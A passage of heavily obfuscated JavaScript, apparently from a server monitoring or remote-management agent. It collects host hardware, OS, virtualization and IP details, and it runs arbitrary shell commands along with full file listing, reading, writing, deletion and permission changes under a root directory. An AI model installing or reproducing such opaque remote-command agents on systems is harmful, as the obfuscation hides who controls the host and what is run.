            const g = await a0s[bm(0x1a9)]();
            b = g['total'], (a[bm(0x6a4)](c, null) || a[bm(0x3d9)](isNaN, c)) && (c = g[bm(0x2b1)]);
        }
        return {
            'total': b,
            'used': c,
            'available': b - c,
            'free': b - c,
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async [a0aK(0x5ea)]() {
        const bn = a0aK, [a, b, c, d] = await Promise[bn(0x407)]([
                a0s[bn(0x5c7)](),
                this['getContainerMemory'](),
                a0s['osInfo'](),
                a0s[bn(0x5c0)]()
            ]);
        let f = null, g = null;
        try {
            [f, g] = await Promise[bn(0x407)]([
                this[bn(0x421)](),
                this[bn(0x329)]()
            ]);
        } catch (h) {
            a0A[bn(0x550)](bn(0x2d4) + h[bn(0x564)], 0x1);
        }
        return {
            'arch': a0o[bn(0x52e)](),
            'cpu_cores': a[bn(0x3df)],
            'cpu_name': a[bn(0x3f6)],
            'disk_total': (await a0s['fsSize']())[0x0]?.[bn(0x6b6)] || 0x0,
            'gpu_name': '',
            'ipv4': f,
            'ipv6': g,
            'mem_total': b[bn(0x34e)],
            'os': c['distro'] + '\x20' + c[bn(0x10d)],
            'kernel_version': c[bn(0x4f8)],
            'swap_total': b[bn(0x1b4)],
            'version': a0M['AGENT_VERSION'],
            'virtualization': await this[bn(0x255)](),
            'session_key': a0M[bn(0x525)],
            'noise_key': a0M[bn(0x1ba)]
        };
    }
    ['getLocalIPv4']() {
        const bo = a0aK, a = {
                'LWYUS': function (c, d) {
                    return c === d;
                }
            }, b = a0o[bo(0x5c0)]();
        for (const c of Object[bo(0x654)](b)) {
            for (const d of b[c]) {
                const f = a[bo(0x30c)](d[bo(0x316)], 'IPv4') || a[bo(0x30c)](d[bo(0x316)], 0x4);
                if (f && !d[bo(0x2f3)]) {
                    if (!/^10\./['test'](d['address']) && !/^192\.168\./[bo(0x4ea)](d[bo(0x2d9)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./['test'](d[bo(0x2d9)]))
                        return d[bo(0x2d9)];
                }
            }
        }
        return null;
    }
    async ['getPublicIpV4']() {
        const bp = a0aK, a = {
                'VLEGU': bp(0x3cd),
                'kqUEO': 'https://checkip.amazonaws.com',
                'sirEn': bp(0x62f),
                'aPWjw': 'https://ipinfo.io/ip',
                'eidCk': bp(0x6c1)
            }, b = [
                a['VLEGU'],
                bp(0x11e),
                a[bp(0x487)],
                a[bp(0x15e)],
                bp(0x3f9),
                a[bp(0x6eb)],
                a[bp(0x434)]
            ];
        for (const d of b) {
            try {
                const f = await this[bp(0x32d)](d, 0x4);
                if (f && this[bp(0x1fa)](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this['getLocalIPv4']();
        if (c && this[bp(0x1fa)](c))
            return c;
        return null;
    }
    [a0aK(0x40b)]() {
        const bq = a0aK, a = {
                'mhtnI': bq(0x503),
                'cRARt': function (c, d) {
                    return c === d;
                },
                'RWNdT': bq(0x595)
            }, b = a0o['networkInterfaces']();
        for (const c of Object[bq(0x654)](b)) {
            for (const d of b[c]) {
                const f = d[bq(0x316)] === a[bq(0x54d)] || a[bq(0x216)](d['family'], 0x6);
                if (f && !d[bq(0x2f3)]) {
                    if (!d[bq(0x2d9)][bq(0x425)]()['startsWith'](a[bq(0x41c)]))
                        return d['address'];
                }
            }
        }
        return null;
    }
    async [a0aK(0x329)]() {
        const br = a0aK, a = {
                'vRtlI': 'https://icanhazip.com',
                'FqYFm': 'https://v6.ident.me'
            }, b = this[br(0x40b)]();
        if (b && this[br(0x399)](b))
            return b;
        const c = [
            br(0x2ae),
            a['vRtlI'],
            a[br(0x304)]
        ];
        for (const d of c) {
            try {
                const f = await this['fetchIP'](d, 0x6);
                if (f && this[br(0x399)](f))
                    return f;
            } catch (g) {
                a0A[br(0x550)](br(0x1cf) + d + br(0x660) + g[br(0x564)]);
                continue;
            }
        }
        return null;
    }
    async ['fetchIP'](a, b = 0x0) {
        const bs = a0aK, c = {
                'QSFIh': function (d, f) {
                    return d(f);
                },
                'NxGbf': function (d, f) {
                    return d !== f;
                },
                'PMMyG': bs(0x5f4),
                'fSqUZ': bs(0x310),
                'cVzEn': bs(0x528)
            };
        return new Promise((d, f) => {
            const bu = bs, g = {
                    'vRSrI': function (k, l) {
                        const bt = a0b;
                        return c[bt(0x522)](k, l);
                    },
                    'WEBEm': bu(0x6ac)
                }, h = c[bu(0x6b7)](require, c['PMMyG']), i = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': c[bu(0x20c)] }
                }, j = h[bu(0x12e)](a, i, k => {
                    const bv = bu;
                    let l = '';
                    if (g[bv(0x1b1)](k[bv(0x328)], 0xc8)) {
                        f(new Error('HTTP\x20' + k[bv(0x328)]));
                        return;
                    }
                    k['on'](g[bv(0x1ad)], m => l += m), k['on'](bv(0x42b), () => d(l['trim']()));
                });
            j['on'](c['cVzEn'], f), j[bu(0x133)](0x1388, () => {
                const bw = bu;
                j[bw(0x2dc)](), c['QSFIh'](f, new Error('请求超时'));
            });
        });
    }
    [a0aK(0x1fa)](a) {
        const bx = a0aK;
        return /^(\d{1,3}\.){3}\d{1,3}$/[bx(0x4ea)](a);
    }
    [a0aK(0x399)](a) {
        const by = a0aK;
        if (!/^[0-9a-fA-F:]+$/[by(0x4ea)](a) || !a[by(0x2a8)](':'))
            return ![];
        if (/^(fe[89ab]|f[cd]|::1$|::$)/i[by(0x4ea)](a))
            return ![];
        return !![];
    }
    async [a0aK(0x190)]() {
        const bz = a0aK, a = {
                'HDlUD': function (m, n) {
                    return m / n;
                },
                'XcILb': function (m, n) {
                    return m - n;
                },
                'UFXhh': function (m, n) {
                    return m / n;
                },
                'fskKk': function (m, n) {
                    return m / n;
                },
                'wCwlU': function (m, n) {
                    return m * n;
                },
                'epZCw': function (m, n) {
                    return m / n;
                }
            }, [b, c, d, f] = await Promise[bz(0x407)]([
                a0s[bz(0x6c8)](),
                a0s[bz(0x1a9)](),
                a0s[bz(0x365)](),
                a0s[bz(0x6c8)]()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = a[bz(0x57b)](Date['now'](), 0x3e8), i = a['XcILb'](h, this[bz(0x155)]), j = a[bz(0x361)](g[bz(0x312)], this[bz(0x3f7)]['tx']), k = g[bz(0x463)] - this[bz(0x3f7)]['rx'];
        this[bz(0x6b1)] += j, this[bz(0x332)] += k, this[bz(0x3f7)] = {
            'tx': g[bz(0x312)],
            'rx': g[bz(0x463)]
        }, this[bz(0x155)] = h;
        const l = await a0s['processes']();
        return {
            'cpu': { 'usage': Math[bz(0x516)](b[bz(0x6c8)]) },
            'ram': {
                'total': c[bz(0x34e)],
                'used': c[bz(0x235)]
            },
            'swap': {
                'total': c['swaptotal'],
                'used': c[bz(0x6e6)]
            },
            'load': {
                'load1': a[bz(0x3b8)](Math[bz(0x516)](f[bz(0x409)] * 0x64), 0x64),
                'load5': a[bz(0x674)](Math[bz(0x516)](a[bz(0x5a9)](f[bz(0x409)], 0x64)), 0x64),
                'load15': a[bz(0x704)](Math[bz(0x516)](f[bz(0x409)] * 0x64), 0x64)
            },
            'disk': await this[bz(0x698)](),
            'network': {
                'up': Math[bz(0x516)](a[bz(0x57b)](j, i)),
                'down': Math[bz(0x516)](a[bz(0x674)](k, i)),
                'totalUp': this['totalNetworkUp'],
                'totalDown': this['totalNetworkDown']
            },
            'connections': await this['_getConnections'](),
            'uptime': a0o[bz(0x5ba)](),
            'process': l?.[bz(0x407)] || 0x0,
            'message': ''
        };
    }
    async [a0aK(0x255)]() {
        const bA = a0aK, a = {
                'OZLJL': bA(0x2be),
                'sQusU': bA(0x1b9),
                'dcjlZ': bA(0x299),
                'sQUZC': bA(0x3db),
                'fXFdN': bA(0x5c8),
                'fHZiY': bA(0x67b),
                'eogGM': bA(0x292),
                'JYspr': bA(0x114),
                'MBdSS': bA(0x666),
                'FgkPa': bA(0x13e),
                'XxtcG': 'LXC',
                'FYDiZ': '/proc/self/mountinfo',
                'NTKGi': bA(0x158),
                'sJzAu': bA(0x1c7),
                'yFHEh': bA(0x43a),
                'LeEFF': bA(0x19f),
                'rfULJ': bA(0x647),
                'SbqSg': bA(0x1ce),
                'RexJJ': bA(0x2b6),
                'LUnxx': bA(0x526)
            };
        try {
            if (a0l[bA(0x5ed)](bA(0x1a7)))
                return a[bA(0x6e7)];
            if (a0l['existsSync'](a[bA(0x3e7)]))
                return a[bA(0x618)];
            if (a0l[bA(0x5ed)](bA(0x3db))) {
                const b = a0l[bA(0x5d3)](a['sQUZC'], a[bA(0x126)])[bA(0x425)]();
                if (b[bA(0x2a8)](a[bA(0x694)]) || b[bA(0x2a8)](a[bA(0x2ca)]))
                    return 'Docker';
                else {
                    if (b[bA(0x2a8)](a[bA(0x601)]))
                        return a[bA(0x14c)];
                    else {
                        if (b[bA(0x2a8)](a[bA(0x696)]))
                            return a['XxtcG'];
                    }
                }
            }
            if (a0l[bA(0x5ed)](bA(0x501))) {
                const c = a0l[bA(0x5d3)](a[bA(0x249)], a[bA(0x126)]);
                if (c['includes'](a['NTKGi']) || c[bA(0x2a8)]('workdir=/var/lib/docker'))
                    return a[bA(0x6e7)];
                else {
                    if (c['includes'](a[bA(0x263)]) || c[bA(0x2a8)](bA(0x27d)))
                        return bA(0x666);
                }
            }
            if (a0l['existsSync'](a['yFHEh'])) {
                const d = a0l[bA(0x5d3)](a[bA(0x4cf)], a['fXFdN']);
                if (d[bA(0x2a8)](a[bA(0x639)]))
                    return a[bA(0x334)];
            }
            if (a0l[bA(0x5ed)](a[bA(0x45b)])) {
                const f = a0l['readFileSync'](bA(0x647), a[bA(0x126)]);
                if (f['includes'](a[bA(0x3c6)]) || f[bA(0x2a8)](a[bA(0x258)]))
                    return a['SbqSg'];
            }
        } catch (g) {
        }
        return a[bA(0x571)];
    }
    async [a0aK(0x698)]() {
        const bB = a0aK, a = {
                'nBXpQ': function (b, c) {
                    return b > c;
                },
                'Wcefw': function (b, c) {
                    return b !== c;
                },
                'edVPA': 'tmpfs',
                'OoTzc': bB(0x4dd)
            };
        try {
            const b = await a0s['fsSize'](), c = b[bB(0x6cc)](g => {
                    const bC = bB;
                    return a[bC(0x673)](g['size'], 0x0) && a[bC(0x6fd)](g[bC(0x240)], a[bC(0x682)]) && g[bC(0x240)] !== bC(0x4b4) && g['fs'][bC(0x21e)](a[bC(0x28e)]);
                }), d = c[bB(0x681)]((g, h) => g + h[bB(0x6b6)], 0x0), f = c[bB(0x681)]((g, h) => g + h['used'], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async [a0aK(0x706)]() {
        const bD = a0aK;
        try {
            const a = await a0s['networkConnections'](), b = a[bD(0x6cc)](d => d[bD(0x4a3)] === bD(0x229))[bD(0x5a7)], c = a[bD(0x6cc)](d => d['protocol'] === bD(0x502))[bD(0x5a7)];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0R {
    static async ['execute'](a, b = {}) {
        const bE = a0aK, c = {
                'XlWgu': function (d, f) {
                    return d - f;
                },
                'aiJoO': function (d, f) {
                    return d === f;
                },
                'nkVAf': function (d, f, g, h) {
                    return d(f, g, h);
                },
                'ATcMd': function (d, f) {
                    return d * f;
                },
                'yUChK': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process[bE(0x441)](),
                env: env = {},
                timeout: timeout = a0M['Rtimeout']
            } = b;
        return new Promise(d => {
            const bH = bE, f = {
                    'NLuVc': function (i, j) {
                        const bF = a0b;
                        return c[bF(0x227)](i, j);
                    },
                    'XrFUJ': function (i, j) {
                        const bG = a0b;
                        return c[bG(0x417)](i, j);
                    },
                    'VMYkY': function (i, j) {
                        return i(j);
                    }
                }, g = Date[bH(0x65e)](), h = c[bH(0x567)](a0p, a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': c[bH(0x6ed)](timeout, 0x3e8),
                    'maxBuffer': c[bH(0x6ed)](c[bH(0x2e8)](0xa, 0x400), 0x400)
                }, (i, j, k) => {
                    const bI = bH, l = f['NLuVc'](Date[bI(0x65e)](), g), m = i && i[bI(0x14b)] && i[bI(0x572)];
                    let n = j || '';
                    if (k)
                        n += k;
                    let o = 0x0;
                    if (i) {
                        if (m)
                            o = 0x7c;
                        else
                            f[bI(0x57f)](typeof i[bI(0x546)], bI(0x27f)) ? o = i[bI(0x546)] : o = -0x1;
                    }
                    f[bI(0x5b9)](d, {
                        'result': n,
                        'exitcode': o,
                        'timeout': m,
                        'cmd': a
                    });
                });
        });
    }
}
class a0S {
    static async ['listFiles'](a, b = ![]) {
        const bJ = a0aK, c = {
                'NBbqa': bJ(0x191),
                'QGIpD': 'file',
                'PYqru': function (h, i) {
                    return h & i;
                },
                'wnVfk': bJ(0x157),
                'iyEjH': function (h, i) {
                    return h(i);
                }
            }, d = a0n[bJ(0x6d9)](a0M['FILE_ROOT'], a || '.');
        if (!d[bJ(0x21e)](a0M[bJ(0x4c4)]))
            throw new Error(bJ(0x663));
        if (!a0l[bJ(0x5ed)](d))
            throw new Error(c[bJ(0x2d8)]);
        const f = [], g = h => {
                const bK = bJ, i = a0l[bK(0x1d8)](h);
                for (const j of i) {
                    const k = a0n[bK(0x575)](h, j), l = a0l[bK(0x5a3)](k), m = new a0I();
                    m[bK(0x38e)] = j, m[bK(0x5d0)] = a0n[bK(0x1c9)](a0M[bK(0x4c4)], k), m[bK(0x240)] = l[bK(0x41f)]() ? c[bK(0x6a8)] : c[bK(0x2f6)], m[bK(0x6b6)] = l[bK(0x6b6)], m[bK(0x2f8)] = l['mtime'][bK(0x1fd)](), m[bK(0x2e3)] = this[bK(0x306)](l[bK(0x2e3)], l[bK(0x41f)]()), m['mode_octal'] = '0o' + c['PYqru'](l[bK(0x2e3)], 0x1ff)[bK(0x206)](0x8), m[bK(0x353)] = l[bK(0x578)] + ':' + l[bK(0x4ec)], f['push'](m), b && l[bK(0x41f)]() && g(k);
                }
            };
        return c[bJ(0x35d)](g, d), f;
    }
    static async [a0aK(0x679)](a) {
        const bL = a0aK, b = {
                'tMiOb': function (d, f) {
                    return d & f;
                },
                'qAVgf': 'directory',
                'cNlbl': bL(0x366)
            }, c = [];
        for (const d of a) {
            const f = a0n[bL(0x6d9)](a0M[bL(0x4c4)], d);
            if (!f[bL(0x21e)](a0M[bL(0x4c4)]))
                continue;
            try {
                const g = a0l[bL(0x5a3)](f), h = this[bL(0x44e)](f, a0l[bL(0x680)]['R_OK']), i = this['_checkAccess'](f, a0l[bL(0x680)][bL(0x28c)]), j = this[bL(0x44e)](f, a0l[bL(0x680)]['X_OK']), k = new a0J();
                k[bL(0x5d0)] = a0n['relative'](a0M[bL(0x4c4)], f), k[bL(0x38e)] = a0n[bL(0x1e8)](f), k[bL(0x2e3)] = this[bL(0x306)](g[bL(0x2e3)], g['isDirectory']()), k[bL(0x650)] = '0o' + b[bL(0x134)](g[bL(0x2e3)], 0x1ff)['toString'](0x8), k[bL(0x240)] = g[bL(0x41f)]() ? b['qAVgf'] : b[bL(0x23d)], k[bL(0x560)] = h, k[bL(0x490)] = i, k[bL(0x667)] = j, c[bL(0x293)](k);
            } catch (l) {
            }
        }
        return c;
    }
    static [a0aK(0x44e)](a, b) {
        try {
            return a0l['accessSync'](a, b), !![];
        } catch {
            return ![];
        }
    }
    static [a0aK(0x459)](a) {
        const bM = a0aK, b = {
                'QKbhQ': 'string',
                'VjDey': function (c, d, f) {
                    return c(d, f);
                },
                'XzgJr': bM(0x636)
            };
        if (typeof a === bM(0x27f))
            return a;
        if (typeof a === b[bM(0x47a)]) {
            const c = a[bM(0x61b)]();
            if (/^[0-7]{3,4}$/[bM(0x4ea)](c))
                return b[bM(0x64c)](parseInt, c, 0x8);
        }
        throw new Error(b[bM(0x3a0)]);
    }
    static [a0aK(0x306)](a, b) {
        const bN = a0aK, c = {
                'VkMFz': function (i, j, k) {
                    return i(j, k);
                }
            }, d = b ? 'd' : '-', f = [
                'r',
                'w',
                'x'
            ], g = (a & 0x1ff)['toString'](0x8)[bN(0x244)](0x3, '0');
        let h = d;
        for (const i of g) {
            const j = c[bN(0x6cf)](parseInt, i, 0xa);
            h += f[bN(0x5b6)]((k, l) => j & 0x4 >> l ? k : '-')[bN(0x575)]('');
        }
        return h;
    }
    static async [a0aK(0x1a5)](a, b = ![]) {
        const bO = a0aK, c = {
                'aQKrC': function (g, h) {
                    return g(h);
                },
                'EXSRa': bO(0x528)
            }, d = [];
        for (const [g, h] of Object['entries'](a)) {
            const i = a0n[bO(0x6d9)](a0M[bO(0x4c4)], g);
            if (!i[bO(0x21e)](a0M[bO(0x4c4)])) {
                d['push']({
                    'path': g,
                    'requested': c[bO(0x3cc)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': 'access_denied'
                });
                continue;
            }
            try {
                const j = this[bO(0x459)](h), k = m => {
                        const bP = bO;
                        a0l[bP(0x50f)](m, j);
                    };
                if (b && a0l[bO(0x5ed)](i) && a0l[bO(0x5a3)](i)[bO(0x41f)]()) {
                    const m = n => {
                        const bQ = bO;
                        c['aQKrC'](k, n);
                        const o = a0l[bQ(0x1d8)](n);
                        for (const p of o) {
                            const q = a0n[bQ(0x575)](n, p);
                            a0l['statSync'](q)[bQ(0x41f)]() ? c[bQ(0x3cc)](m, q) : c[bQ(0x3cc)](k, q);
                        }
                    };
                    m(i);
                } else
                    c[bO(0x3cc)](k, i);
                const l = j['toString'](0x8);
                d['push']({
                    'path': g,
                    'requested': c[bO(0x3cc)](String, h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d[bO(0x293)]({
                    'path': g,
                    'requested': String(h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[bO(0x4d7)],
                    'message': n[bO(0x564)]
                });
            }
        }
        const f = d[bO(0x6cc)](o => o['status'] === 'ok')['length'];
        return {
            'status': 'ok',
            'total': d[bO(0x5a7)],
            'success': f,
            'results': d
        };
    }
    static async ['readFile'](a) {
        const bR = a0aK, b = {
                'Abfqc': bR(0x663),
                'LQVnt': function (h, i) {
                    return h > i;
                },
                'AtgWB': bR(0x529),
                'cCbws': bR(0x5c8),
                'fywno': bR(0x4d0)
            }, c = a0n[bR(0x6d9)](a0M['FILE_ROOT'], a);
        if (!c[bR(0x21e)](a0M[bR(0x4c4)]))
            throw new Error(b['Abfqc']);
        const d = a0l[bR(0x5a3)](c);
        if (b[bR(0x1e1)](d[bR(0x6b6)], 0x400 * 0x400))
            throw new Error(b[bR(0x199)]);
        const f = a0l[bR(0x5d3)](c), g = this[bR(0x61d)](f);
        return {
            'status': 'ok',
            'path': a0n['relative'](a0M['FILE_ROOT'], c),
            'content': g ? a0u[bR(0x653)](f) : f[bR(0x206)](b[bR(0x484)]),
            'encoding': g ? b['fywno'] : bR(0x1fc),
            'is_binary': g,
            'size': d[bR(0x6b6)]
        };
    }
    static [a0aK(0x61d)](a) {
        const bS = a0aK, b = {
                'xhfGd': function (c, d) {
                    return c === d;
                },
                'KjchY': function (c, d) {
                    return c < d;
                },
                'EEIIt': function (c, d) {
                    return c === d;
                }
            };
        if (!a || b['xhfGd'](a['length'], 0x0))
            return ![];
        for (let c = 0x0; b[bS(0x515)](c, Math['min'](a[bS(0x5a7)], 0x200)); c++) {
            if (b[bS(0x508)](a[c], 0x0))
                return !![];
        }
        return ![];
    }
    static async [a0aK(0x6ce)](a, b, c, d = null, f = null) {
        const bT = a0aK, g = {
                'iPFtK': 'Access\x20denied:\x20path\x20outside\x20root',
                'QlJhb': function (l, m) {
                    return l > m;
                },
                'eboJP': bT(0x529),
                'uzddX': function (l, m) {
                    return l !== m;
                },
                'ADWpC': function (l, m) {
                    return l(m);
                },
                'jXSBG': bT(0x2b0),
                'yxecv': bT(0x1b6),
                'cPsSW': function (l, m) {
                    return l === m;
                }
            }, h = a0n[bT(0x6d9)](a0M[bT(0x4c4)], a);
        let j = h;
        b && (j = a0n[bT(0x575)](h, b));
        if (!j['startsWith'](a0M[bT(0x4c4)]))
            throw new Error(g['iPFtK']);
        !a0l['existsSync'](a0n[bT(0x4db)](j)) && a0l['mkdirSync'](a0n[bT(0x4db)](j), { 'recursive': !![] });
        const k = a0u[bT(0x50a)](c);
        if (g[bT(0x61e)](k[bT(0x5a7)], a0M[bT(0x472)]))
            throw new Error(g[bT(0x69d)]);
        if (d !== null && g['uzddX'](f, null)) {
            const l = g[bT(0x2df)](Number, d), m = Number(f);
            if (Number[bT(0x278)](l) || Number[bT(0x278)](m))
                throw new Error(g['jXSBG']);
            const n = a0n['join'](a0n[bT(0x4db)](j), g['yxecv'], a0n[bT(0x1e8)](j));
            !a0l[bT(0x5ed)](n) && a0l['mkdirSync'](n, { 'recursive': !![] });
            const o = a0n['join'](n, bT(0x2a2) + l);
            a0l[bT(0x414)](o, k);
            const p = a0l[bT(0x1d8)](n)[bT(0x6cc)](s => s[bT(0x21e)]('chunk_')), q = p['length'], r = g[bT(0x53f)](q, m);
            if (r) {
                const s = a0l['createWriteStream'](j);
                for (let t = 0x0; t < m; t++) {
                    const u = a0n[bT(0x575)](n, bT(0x2a2) + t);
                    if (!a0l[bT(0x5ed)](u)) {
                        s['close']();
                        throw new Error(bT(0x1d9) + t);
                    }
                    s['write'](a0l[bT(0x5d3)](u));
                }
                s[bT(0x42b)]();
                for (const v of a0l[bT(0x1d8)](n)) {
                    a0l[bT(0x37e)](a0n[bT(0x575)](n, v));
                }
                a0l[bT(0x47e)](n, {
                    'recursive': !![],
                    'force': !![]
                });
            }
            return {
                'status': 'ok',
                'path': a0n['relative'](a0M[bT(0x4c4)], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0l['writeFileSync'](j, k), {
            'status': 'ok',
            'path': a0n[bT(0x1c9)](a0M[bT(0x4c4)], j),
            'received': k[bT(0x5a7)],
            'total': k[bT(0x5a7)],
            'chunked': ![]
        };
    }
    static async [a0aK(0x2e7)](a, b, c, d = null, f = null) {
        const bU = a0aK, g = {
                'UBAUa': function (k, l) {
                    return k || l;
                },
                'xKTsr': bU(0x529),
                'yZmQm': function (k, l) {
                    return k !== l;
                },
                'JSLpy': function (k, l) {
                    return k !== l;
                },
                'rReYP': bU(0x2b0),
                'AoSzH': bU(0x1b6),
                'cJDzt': function (k, l) {
                    return k < l;
                },
                'MYulg': bU(0x527)
            }, h = a0n['resolve'](a0M[bU(0x4c4)], g[bU(0x43e)](a, '.'));
        let j = h;
        b && (j = a0n['join'](h, b));
        if (!j[bU(0x21e)](a0M[bU(0x4c4)]))
            throw new Error(bU(0x663));
        !a0l[bU(0x5ed)](a0n['dirname'](j)) && a0l['mkdirSync'](a0n[bU(0x4db)](j), { 'recursive': !![] });
        if (c['length'] > a0M[bU(0x472)])
            throw new Error(g[bU(0x1d5)]);
        if (g[bU(0x2de)](d, null) && g['JSLpy'](f, null)) {
            const k = Number(d), l = Number(f);
            if (Number[bU(0x278)](k) || Number['isNaN'](l))
                throw new Error(g[bU(0x4a2)]);
            const m = a0n[bU(0x575)](a0n[bU(0x4db)](j), g['AoSzH'], a0n[bU(0x1e8)](j));
            !a0l[bU(0x5ed)](m) && a0l[bU(0x386)](m, { 'recursive': !![] });
            const n = a0n[bU(0x575)](m, bU(0x2a2) + k);
            a0l[bU(0x414)](n, c);
            const o = a0l[bU(0x1d8)](m)['filter'](r => r[bU(0x21e)](bU(0x2a2))), p = o[bU(0x5a7)], q = p === l;
            if (q) {
                const r = [];
                for (let s = 0x0; g[bU(0x42f)](s, l); s++) {
                    const t = a0n['join'](m, bU(0x2a2) + s);
                    if (!a0l[bU(0x5ed)](t))
                        throw new Error(bU(0x1d9) + s);
                    r[bU(0x293)](a0l[bU(0x5d3)](t));
                }
                a0l[bU(0x414)](j, Buffer['concat'](r));
                for (const u of a0l[bU(0x1d8)](m)) {
                    a0l[bU(0x37e)](a0n['join'](m, u));
                }
                return a0l[bU(0x47e)](m, {
                    'recursive': !![],
                    'force': !![]
                }), {
                    'status': 'ok',
                    'path': a0n['relative'](a0M[bU(0x4c4)], j),
                    'chunk_id': k,
                    'completed': !![],
                    'message': g[bU(0x5e0)]
                };
            }
            return {
                'status': 'ok',
                'path': a0n['relative'](a0M[bU(0x4c4)], j),
                'chunk_id': k,
                'completed': ![],
                'message': bU(0x6fc) + k + bU(0x5c4)
            };
        }
        return a0l[bU(0x414)](j, c), {
            'status': 'ok',
            'path': a0n[bU(0x1c9)](a0M[bU(0x4c4)], j),
            'chunk_id': 0x0,
            'completed': !![],
            'message': bU(0x479)
        };
    }
    static async [a0aK(0x12d)](a) {
        const bV = a0aK, b = {
                'QxkiL': bV(0x663),
                'hDqSE': bV(0x222)
            }, c = a0n[bV(0x6d9)](a0M[bV(0x4c4)], a);
        if (!c[bV(0x21e)](a0M[bV(0x4c4)]))
            throw new Error(b[bV(0x1bc)]);
        if (!a0l[bV(0x5ed)](c))
            throw new Error(b[bV(0x64f)]);
        const d = a0l[bV(0x5a3)](c), f = a0l['readFileSync'](c), g = a0u[bV(0x653)](f);
        return {
            'path': a0n[bV(0x1c9)](a0M[bV(0x4c4)], c),
            'content': g,
            'size': d['size']
        };
    }
    static async ['deleteFiles'](a) {
        const bW = a0aK, b = {
                'NlTGT': bW(0x5ad),
                'TifNw': bW(0x676),
                'vCXSP': 'not_found'
            }, c = [];
        for (const d of a) {
            const f = a0n[bW(0x6d9)](a0M[bW(0x4c4)], d);
            if (!f[bW(0x21e)](a0M[bW(0x4c4)])) {
                c[bW(0x293)]({
                    'path': d,
                    'status': b[bW(0x34a)]
                });
                continue;
            }
            try {
                if (a0l[bW(0x5ed)](f)) {
                    const g = a0l[bW(0x5a3)](f);
                    g[bW(0x41f)]() ? a0l['rmSync'](f, {
                        'recursive': !![],
                        'force': !![]
                    }) : a0l['unlinkSync'](f), c[bW(0x293)]({
                        'path': d,
                        'status': b[bW(0x4c9)]
                    });
                } else
                    c[bW(0x293)]({
                        'path': d,
                        'status': b[bW(0x163)]
                    });
            } catch (h) {
                c['push']({
                    'path': d,
                    'status': bW(0x528),
                    'message': h[bW(0x564)]
                });
            }
        }
        return c;
    }
    static async ['moveFiles'](a) {
        const bX = a0aK, b = {
                'rinMD': bX(0x5ad),
                'NOHAh': bX(0x528)
            }, c = [];
        for (const [d, f] of Object[bX(0x354)](a)) {
            const g = a0n['resolve'](a0M['FILE_ROOT'], d), h = a0n[bX(0x6d9)](a0M[bX(0x4c4)], f);
            if (!g['startsWith'](a0M[bX(0x4c4)]) || !h[bX(0x21e)](a0M[bX(0x4c4)])) {
                c[bX(0x293)]({
                    'from': d,
                    'to': f,
                    'status': b[bX(0x232)]
                });
                continue;
            }
            try {
                const i = a0n[bX(0x4db)](h);
                !a0l[bX(0x5ed)](i) && a0l[bX(0x386)](i, { 'recursive': !![] }), a0l[bX(0x283)](g, h), c['push']({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
                c[bX(0x293)]({
                    'from': d,
                    'to': f,
                    'status': b['NOHAh'],
                    'message': j[bX(0x564)]
                });
            }
        }
        return c;
    }
    static async ['copyFiles'](a) {
        const bY = a0aK, b = {
                'eHRBK': function (d, f, g) {
                    return d(f, g);
                },
                'IMHyg': bY(0x5ad),
                'ZeJKr': bY(0x5d7),
                'iwzcC': bY(0x528)
            }, c = [];
        for (const [d, f] of Object[bY(0x354)](a)) {
            const g = a0n['resolve'](a0M[bY(0x4c4)], d), h = a0n[bY(0x6d9)](a0M['FILE_ROOT'], f);
            if (!g[bY(0x21e)](a0M[bY(0x4c4)]) || !h[bY(0x21e)](a0M[bY(0x4c4)])) {
                c[bY(0x293)]({
                    'from': d,
                    'to': f,
                    'status': b[bY(0x504)]
                });
                continue;
            }
            try {
                if (!a0l[bY(0x5ed)](g)) {
                    c[bY(0x293)]({
                        'from': d,
                        'to': f,
                        'status': b['ZeJKr']
                    });
                    continue;
                }
                const i = a0n[bY(0x4db)](h);
                !a0l['existsSync'](i) && a0l[bY(0x386)](i, { 'recursive': !![] });
                const j = a0l[bY(0x5a3)](g);
                if (j['isDirectory']()) {
                    if (a0l[bY(0x215)])
                        a0l[bY(0x215)](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const bZ = bY;
                            if (a0l['statSync'](l)[bZ(0x41f)]()) {
                                if (!a0l[bZ(0x5ed)](m))
                                    a0l[bZ(0x386)](m, { 'recursive': !![] });
                                for (const n of a0l['readdirSync'](l)) {
                                    b['eHRBK'](k, a0n['join'](l, n), a0n[bZ(0x575)](m, n));
                                }
                            } else
                                a0l[bZ(0x24b)](l, m);
                        };
                        b[bY(0x59f)](k, g, h);
                    }
                } else
                    a0l[bY(0x24b)](g, h);
                c['push']({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c['push']({
                    'from': d,
                    'to': f,
                    'status': b[bY(0x493)],
                    'message': l[bY(0x564)]
                });
            }
        }
        return c;
    }
    static async [a0aK(0x60a)](a) {
        const c0 = a0aK, b = { 'IUbIi': c0(0x663) }, c = a0n[c0(0x6d9)](a0M['FILE_ROOT'], a);
        if (!c['startsWith'](a0M['FILE_ROOT']))
            throw new Error(b['IUbIi']);
        return a0l[c0(0x386)](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0n[c0(0x1c9)](a0M['FILE_ROOT'], c)
        };
    }
}
class a0T {
    static ['cronJobs'] = new Map();
    static [a0aK(0x14f)](a, b) {
        const c1 = a0aK, c = {
                'ktoIh': function (d, f) {
                    return d > f;
                },
                'hYJsw': function (d, f) {
                    return d - f;
                }
            };
